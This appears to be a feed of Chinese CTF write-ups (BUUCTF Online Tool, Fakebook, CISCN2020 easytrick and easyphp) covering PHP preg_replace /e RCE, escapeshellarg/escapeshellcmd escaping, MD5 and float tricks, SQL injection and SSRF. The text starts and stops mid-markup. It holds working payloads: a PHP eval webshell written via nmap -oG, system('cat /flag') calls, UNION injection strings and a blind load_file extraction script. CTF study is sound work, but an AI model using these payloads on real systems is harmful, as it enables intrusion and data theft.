$str</span>) </span>&#123;    <span class="hljs-keyword">return</span> preg_replace(        <span class="hljs-string">&#x27;/(&#x27;</span> . $re . <span class="hljs-string">&#x27;)/ei&#x27;</span>,        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,        $str    );&#125;<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $re =&gt; $str) &#123;    <span class="hljs-keyword">echo</span> complex($re, $str). <span class="hljs-string">&quot;\n&quot;</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;@<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&#125;</code></pre><blockquote><p>/e模式的preg_replace,有一个远程代码执行漏洞。利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。</p></blockquote><blockquote><p>反向引用</p><blockquote><p>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，\1指的是第一个匹配项</p></blockquote></blockquote><p>官方payload<code>/?.*=&#123;$&#123;phpinfo()&#125;&#125;</code>即</p><pre><code class="hljs dart">preg_replace(<span class="hljs-string">&#x27;/(.*)/ei&#x27;</span>,<span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="hljs-string">&#x27;&#123;<span class="hljs-subst">$&#123;phpinfo()&#125;</span>&#125;&#x27;</span>);</code></pre><p>GET方式传的字符串，.会被替换成_，这里采用</p><p><code>\S*=$&#123;phpinfo()&#125;  #\S </code>在php正则表达式中表示匹配所有非空字符，*表示多次匹配</p><p>payload:</p><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);</code></pre><h2 id="绕过escapeshellarg-escapeshellcmd函数"><a class="header-anchor" href="#绕过escapeshellarg-escapeshellcmd函数">🍭</a>绕过escapeshellarg+escapeshellcmd函数</h2><blockquote><p>escapeshellarg</p><blockquote><p>给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入shell 函数，并且还是确保安全的。</p></blockquote></blockquote><blockquote><p>escapeshellcmd</p><blockquote><p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。反斜线（\）会在以下字符之前插入： &amp;#;`|?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 *’ 和 “ 仅在不配对时被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p></blockquote></blockquote><p>在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。但即使参数用了 <strong>escapeshellarg</strong> 函数过滤单引号，但参数在拼接命令的时候如果用了双引号的话还是会导致命令执行的漏洞。</p><p>escapeshellcmd同样是对单引号进行处理，但是有区别</p><p><img src="/2021/04/17/lowtype/2.png" alt="2"></p><p>对于单个单引号, <strong>escapeshellarg</strong> 函数转义后,还会在左右各加一个单引号,但 <strong>escapeshellcmd</strong> 函数是直接加一个转义符，对于成对的单引号, <strong>escapeshellcmd</strong> 函数默认不转义,但 <strong>escapeshellarg</strong> 函数转义。</p><p>测试：</p><img src="/2021/04/17/lowtype/3.jpg" alt="3" style="zoom: 50%;"><blockquote><p>一开始传入的参数<br>127.0.0.1’ -v -d a=1<br>经过escapeshellarg函数处理，先转义再用单引号括起来<br>‘127.0.0.1’‘’ -v -d a=1’<br>再经过escapeshellcmd函数处理，数中的\以及a=1’中的单引号进行处理转义<br>‘127.0.0.1’\‘’ -v -d a=1’<br>由于这一步的处理，使得\被解释成了\而不再是转义字符，所以单引号配对连接之后将语句分割为三个部分</p></blockquote><p>最后system函数是对<code>127.0.0.1\</code>发起请求，POST 数据为<code>a=1'</code>,如果两个函数翻过来则不会出现这个问题</p><h4 id="BUUCTF-2018-Online-Tool"><a class="header-anchor" href="#BUUCTF-2018-Online-Tool">🍭</a>[BUUCTF 2018]Online Tool</h4><img src="/2021/04/17/lowtype/5.png" alt="5" style="zoom: 50%;"><p><strong>nmap命令中 参数<code>-oG</code>可以实现将命令和结果写到文件</strong></p><p>escapeshellarg函数会先对host变量中的单引号进行转义，并且转义之后，在 ’ 的左右两边再加上单引号，变成 <code>'\''</code></p><p>然后escapeshellcmd函数，会对host变量中的特殊字符进行转义</p><pre><code>（&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \x0A//和\xFF以及不配对的单/双引号转义）</code></pre><p>那么上面的 \ 就会被再次转义，比如变成 ‘\’',如果在字符串首尾加上单引号，经过escapeshellarg函数之后，就可以实现将单引号给闭合了，在经过escapeshellcmd函数的时候单引号就是配对的,不会进行转义</p><pre><code class="hljs groovy"><span class="hljs-string">&#x27; genius &#x27;</span><span class="hljs-attr">escapeshellarg:</span><span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> genius <span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-attr">escapeshellcmd:</span> <span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> genius <span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span></code></pre><p>这样可实现单引号逃逸</p><p><img src="/2021/04/17/lowtype/6.png" alt="6"></p><p>但escapeshellcmd会把一句话木马中的一些字符给转义的，经测试在本地执行发现虽然看起来转义了，但写入的话还是没有被转义的</p><img src="/2021/04/17/lowtype/7.jpg" alt="7" style="zoom: 67%;"><p>payload:</p><pre><code class="hljs php-template"><span class="xml">&#x27; </span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml"> -oG 1.php &#x27;</span><span class="xml">或</span><span class="xml">&#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml"> -oG 1.php &#x27;</span></code></pre><p>再用蚁剑连接即可，也可以用get传参：</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://e<span class="hljs-number">5</span>b<span class="hljs-number">384</span>ba-<span class="hljs-number">6852</span>-<span class="hljs-number">4</span>e<span class="hljs-number">3</span>f-<span class="hljs-number">9060</span>-c<span class="hljs-number">66</span>dc<span class="hljs-number">267</span>e<span class="hljs-number">554</span>.node<span class="hljs-number">3</span>.buuoj.cn/<span class="hljs-number">8</span>f<span class="hljs-number">9395193</span>b<span class="hljs-number">358</span>d<span class="hljs-number">86</span>a<span class="hljs-number">100</span>d<span class="hljs-number">2</span>fd<span class="hljs-number">1</span>f<span class="hljs-number">0349</span>a<span class="hljs-number">2</span>/<span class="hljs-number">2</span>.php?a=system(&#x27;cat /flag&#x27;);</code></pre><h2 id="md5强类型"><a class="header-anchor" href="#md5强类型">🍭</a>md5强类型</h2><pre><code class="hljs autoit">(<span class="hljs-built_in">string</span>)$_POST[<span class="hljs-string">&#x27;a1&#x27;</span>]!==(<span class="hljs-built_in">string</span>)$_POST[<span class="hljs-string">&#x27;a2&#x27;</span>] &amp;&amp; md5($_POST[<span class="hljs-string">&#x27;a1&#x27;</span>])===md5($_POST[<span class="hljs-string">&#x27;a2&#x27;</span>])&#125;</code></pre><p>此时使用数组就不可行，因为最后转为字符串进行比较，所以只能构造两个MD5值相同的不同字符串.</p><pre><code class="hljs llvm">两组经过url编码后的值<span class="hljs-symbol">#1</span>a=b=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span class="hljs-symbol">%B7J</span><span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%C0x</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%7</span>B<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%28</span>K<span class="hljs-symbol">%F3n</span><span class="hljs-symbol">%8</span>EKU<span class="hljs-symbol">%B3_Bu</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%D8Igm</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%D1U</span><span class="hljs-symbol">%5</span>D<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%FB_</span><span class="hljs-symbol">%07</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">#2</span>a=b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span></code></pre><h2 id="PHP精度绕过缺陷"><a class="header-anchor" href="#PHP精度绕过缺陷">🍭</a>PHP精度绕过缺陷</h2><p><img src="/2021/04/17/lowtype/9.png" alt="9"></p><p>详见：<a href="http://www.haodaquan.com/12">php踩过的那些坑（1）浮点数计算</a></p><p>PHP 通常使用 IEEE 754 双精度格式而且由于浮点数的精度有限的原因。除此之外取整而导致的最大相对误差为 1.11e-16,当小数小于10^-16后，PHP对于小数就大小不分了，如：</p><p><img src="/2021/04/17/lowtype/10.png" alt="10"></p><p>这个例题明天再做</p><h2 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h2><p>弱类型的绕过有一个共同方向——将要比较的值置零，多数是将值令为空或者令为数组达到相等的效果。</p><p>参考：<a href="https://www.cnblogs.com/Atkx/p/14264132.html#4md5_94">代码审计之弱类型绕过</a></p><p><a href="https://blog.csdn.net/qq_43431158/article/details/103265404">PHP弱类型及一些绕过姿势</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF[网鼎杯 2018]Fakebook</title>
    <link href="/2021/04/16/fakebook/"/>
    <url>/2021/04/16/fakebook/</url>
    
    <content type="html"><![CDATA[<p>这题涉及的知识点比较多。</p><p>查看源码找不到什么有用的信息，扫一下目录</p><p><img src="/2021/04/16/fakebook/1.jpg" alt="1"></p><p>拿到robots.txt,跟进下载user.php.bak</p><p><img src="/2021/04/16/fakebook/2.png" alt="2"></p><p>SSRF详见：<a href="https://liquor-boop.github.io/2021/02/08/SSRF/">SSRF</a></p><p>随便注册一个用户并查看发现网址有点像SQL注入，用sqlmap跑不出来</p><p><img src="/2021/04/16/fakebook/3.jpg" alt="3"></p><p>数据型：</p><p><img src="/2021/04/16/fakebook/6.jpg" alt="6"></p><p>测试列数：</p><p><img src="/2021/04/16/fakebook/4.jpg" alt="4"></p><p>列数为4,继续测试<code>?no=1 union select 1,2,3,4--+</code>显示no hack,判断存在waf，测试了一下应该是空格过滤掉了</p><p><img src="/2021/04/16/fakebook/7.jpg" alt="7"></p><p>出现了反序列化函数，本题解法与反序列化相关。</p><p>爆库</p><p><img src="/2021/04/16/fakebook/8.jpg" alt="8"></p><p>爆表</p><p>payload：</p><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+</span></code></pre><p><img src="/2021/04/16/fakebook/9.jpg" alt="9"></p><p>爆列</p><p>payload</p><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">column_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">columns</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+</span></code></pre><p><img src="/2021/04/16/fakebook/10.jpg" alt="10"></p><p>爆值</p><pre><code class="hljs sql">?no=-1<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">data</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">users</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+</span></code></pre><p><img src="/2021/04/16/fakebook/11.jpg" alt="11"></p><p>可以发现在data字段里有我们最开始填的信息的序列化字符串。我们可以将这个链接也序列化<code>file:///var/www/html/flag.php</code>，把flag.php的读取出来。<br>序列化</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;111&quot;</span>;    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">111</span>;    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name, $age, $blog</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = $name;        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)$age;        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;    &#125;&#125;$a = <span class="hljs-keyword">new</span> UserInfo(‘<span class="hljs-number">111</span>‘,<span class="hljs-number">111</span>,‘file:<span class="hljs-comment">///var/www/html/flag.php‘);</span>$a = serialize($a);<span class="hljs-keyword">echo</span> $a;<span class="hljs-comment">//结果:</span>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">111</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</code></pre><p>因为data是第四个字段，所以序列化后的字符串所以放在4号位上<br>payload</p><pre><code class="hljs rust">?no=-<span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span></span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;--+</code></pre><p>查返回页面的源码，得到编码</p><img src="/2021/04/16/fakebook/12.jpg" alt="12" style="zoom:67%;"><p>这道题在网上有另一种非预期解：</p><p>脚本运行：</p><pre><code class="hljs livecodeserver">import requestsdef <span class="hljs-built_in">exp</span>(url_format,<span class="hljs-built_in">length</span>=None):    rlt = <span class="hljs-string">&#x27;&#x27;</span>    url  = url_format    <span class="hljs-keyword">if</span> <span class="hljs-built_in">length</span>==None:        <span class="hljs-built_in">length</span> = <span class="hljs-number">50</span>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-built_in">length</span>+<span class="hljs-number">1</span>):        begin = <span class="hljs-number">1</span>        <span class="hljs-keyword">ends</span> = <span class="hljs-number">126</span>        tmp = (begin+<span class="hljs-keyword">ends</span><span class="hljs-comment">)//2</span>        <span class="hljs-keyword">while</span> begin&lt;<span class="hljs-keyword">ends</span>:            r = requests.<span class="hljs-built_in">get</span>(url.<span class="hljs-built_in">format</span>(l,tmp))            <span class="hljs-comment">#判断条件根据情况修改</span>            <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span> <span class="hljs-keyword">in</span> r.content:                begin = tmp+<span class="hljs-number">1</span>                tmp = (begin+<span class="hljs-keyword">ends</span><span class="hljs-comment">)//2 </span>            <span class="hljs-keyword">else</span>:                <span class="hljs-keyword">ends</span> = tmp                tmp = (begin+<span class="hljs-keyword">ends</span><span class="hljs-comment">)//2</span>        rlt+=chr(tmp)        print(rlt)    <span class="hljs-literal">return</span> rlt.rstrip()url = <span class="hljs-string">&quot;http://812a2fb3-abaa-4b68-98b4-2bc2172d4509.node3.buuoj.cn/view.php?no=elt(ord(substr(load_file(%27/var/www/html/flag.php%27),&#123;&#125;,1))%3E&#123;&#125;,1)&quot;</span><span class="hljs-built_in">exp</span>(url,<span class="hljs-number">400</span>)</code></pre><p><strong>总结：</strong></p><ul><li>通过注入发现data的数据是序列化的</li><li>代码审计存在可利用的ssrf点</li><li>结合反序列化和ssrf，保证bypass可以被利用</li></ul><p>参考：<a href="http://www.bubuko.com/infodetail-3603593.html">[网鼎杯 2018]Fakebook(SSRF+联合注入绕Waf)</a></p><p><a href="https://www.cnblogs.com/kevinbruce656/p/12643338.html">fakebook题解</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2020</title>
    <link href="/2021/04/15/easytrick/"/>
    <url>/2021/04/15/easytrick/</url>
    
    <content type="html"><![CDATA[<p>这题的利用点之前没遇到过，比较有意思。</p><h2 id="easytrick"><a class="header-anchor" href="#easytrick">🍭</a>easytrick</h2><p>代码：</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span>&#123;    <span class="hljs-keyword">public</span> $trick1;    <span class="hljs-keyword">public</span> $trick2;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;trick1 = (<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;trick1;        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;trick1) &gt; <span class="hljs-number">5</span> || strlen(<span class="hljs-keyword">$this</span>-&gt;trick2) &gt; <span class="hljs-number">5</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你太长了&quot;</span>);        &#125;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;trick1 !== <span class="hljs-keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="hljs-keyword">$this</span>-&gt;trick1) === md5(<span class="hljs-keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;trick1 != <span class="hljs-keyword">$this</span>-&gt;trick2)&#123;            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);        &#125;    &#125;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);unserialize($_GET[<span class="hljs-string">&#x27;trick&#x27;</span>]);</code></pre><p><code>trick1</code> 被强制转成了<code>string</code>类型,因为下面的<code>md5($this-&gt;trick1) === md5($this-&gt;trick2)</code>，虽然是<code>===</code>，但md5函数在处理数组时有缺陷默认数组为<code>0</code>，所以这里才要强制转换下类型。</p><pre><code class="hljs bash">== 和 != 比较如果类型不同，先偿试转换类型，再作值比较，最后返回值比较结果=== 和 !== 只有在相同类型下,才会比较其值</code></pre><p>这题本来可以用MD5后相同字符进行MD5碰撞的，但这里存在长度限制，故要换个思路。</p><h4 id="法一："><a class="header-anchor" href="#法一：">🍭</a>法一：</h4><blockquote><p>tips：<br>INF在PHP中代表的是无穷大的意思<br>NaN常在浮点数运算中使用</p></blockquote><p>payload:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span>&#123;    <span class="hljs-keyword">public</span> $trick1;    <span class="hljs-keyword">public</span> $trick2;&#125;$tr = <span class="hljs-keyword">new</span> trick();$tr-&gt;trick1 = NAN;$tr-&gt;trick2 = NAN;<span class="hljs-keyword">echo</span> serialize($tr);</code></pre><p>NAN代表非数值的特殊值，用于指示某个值不是数字,且与其他数值进行比较的结果总是不相等的，包括自身在内，同类型可见:<a href="https://blog.csdn.net/chunyexiyu/article/details/39179735">与自身不等的浮点数类型</a></p><h4 id="法二："><a class="header-anchor" href="#法二：">🍭</a>法二：</h4><p>这道题是考察<strong>浮点数精度问题导致的大小比较以及函数处理问题</strong>，当小数小于<code>10^-16</code>后，PHP对于小数就大小不分了</p><pre><code class="hljs apache"><span class="hljs-attribute">var_dump</span>(<span class="hljs-number">1</span>.<span class="hljs-number">000000000000000</span> == <span class="hljs-number">1</span>) &gt;&gt; TRUE<span class="hljs-attribute">var_dump</span>(<span class="hljs-number">1</span>.<span class="hljs-number">0000000000000001</span> == <span class="hljs-number">1</span>) &gt;&gt; TRUE<span class="hljs-attribute">strlen</span>(<span class="hljs-number">0</span>.<span class="hljs-number">9999999999999999</span>)=<span class="hljs-number">1</span>//（<span class="hljs-number">17</span>个<span class="hljs-number">9</span>）[在!==和!=下均成立]</code></pre><p>md5函数处理后相同</p><p><img src="/2021/04/15/easytrick/1.png" alt="1"></p><table><thead><tr><th>值范围</th><th>与0.1是否相等</th><th>与0.1的md5值是否相等</th></tr></thead><tbody><tr><td>0.1 到 0.10000000000001</td><td>否</td><td>否</td></tr><tr><td>0.100000000000001 到 0.100000000000001</td><td>否</td><td>是</td></tr><tr><td>0.1000000000000001 到 0.00000000000000…1</td><td>是</td><td>是</td></tr></tbody></table><p>payload:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span>&#123;    <span class="hljs-keyword">public</span> $trick1 ;    <span class="hljs-keyword">public</span> $trick2 ;&#125;$shy = <span class="hljs-keyword">new</span> trick();$shy-&gt;trick1 = <span class="hljs-number">1</span>;$shy-&gt;trick2 = <span class="hljs-number">0.9999999999999999</span>;<span class="hljs-keyword">echo</span> urlencode(serialize($a));</code></pre><p>trick1的值必须为1，因为$this-&gt;trick1 = (string)$this-&gt;trick1;有这个语句的限制，如果为0.9999999999999999，则浮点数就变成了字符类型就不会产生上面的浮点数精度问题。</p><h2 id="easyphp"><a class="header-anchor" href="#easyphp">🍭</a>easyphp</h2><p>题目源码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-comment">//题目环境：php:7.4.8-apache</span>    $pid = pcntl_fork();<span class="hljs-comment">//父进程和子进程都会执行下面代码</span>    <span class="hljs-keyword">if</span> ($pid == <span class="hljs-number">-1</span>) &#123;<span class="hljs-comment">//错误处理：创建子进程失败时返回-1.</span>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;could not fork&#x27;</span>);    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($pid)&#123;<span class="hljs-comment">//父进程会得到子进程号，所以这里是父进程执行的逻辑</span>        $r=pcntl_wait($status);<span class="hljs-comment">//等待子进程中断，防止子进程成为僵尸进程。</span>        <span class="hljs-keyword">if</span>(!pcntl_wifexited($status))&#123;            phpinfo();        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//子进程得到的$pid为0, 所以这里是子进程执行的逻辑。</span>        highlight_file(<span class="hljs-keyword">__FILE__</span>);        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;a&#x27;</span>])&amp;&amp;is_string($_GET[<span class="hljs-string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="hljs-string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,$_GET[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;            call_user_func_array($_GET[<span class="hljs-string">&#x27;a&#x27;</span>],[$_GET[<span class="hljs-string">&#x27;b&#x27;</span>],<span class="hljs-literal">false</span>,<span class="hljs-literal">true</span>]);        &#125;        posix_kill(posix_getpid(), SIGUSR1);    &#125;</code></pre><blockquote><p>pcntl_fork()</p><blockquote><p>是php-pcntl模块中用于创建进程的函数，创建子进程成功后，在父进程内，返回子进程号，在子进程内返回0，失败则返回-1</p></blockquote></blockquote><blockquote><p>pcntl_wait</p><blockquote><p>等待或返回fork的子进程状态</p></blockquote></blockquote><blockquote><p>pcntl_wifexited</p><blockquote><p>检查状态代码是否代表一个正常的退出</p></blockquote></blockquote><blockquote><p>call_user_func_array ( callable $callback , array $param_arr )</p><blockquote><p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p></blockquote></blockquote><p>因为<code>pcntl_wait</code> <strong>父进程等待子进程退出才会执行下面</strong>，我们需要让<strong>子进程不正常退出</strong>，从而执行父进程，获取到phpinfo()。可以写个所有函数名的字典,利用脚本fuzz。</p><p>获取php内置函数名</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//题目环境：php:7.4.8-apache</span>$result = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">foreach</span> (get_defined_functions() <span class="hljs-keyword">as</span> $key =&gt; $val)&#123;    <span class="hljs-keyword">if</span> ($key == <span class="hljs-string">&#x27;internal&#x27;</span>)&#123;        <span class="hljs-keyword">foreach</span> ($val <span class="hljs-keyword">as</span> $k=&gt;$v)&#123;            $result = $result.$v.<span 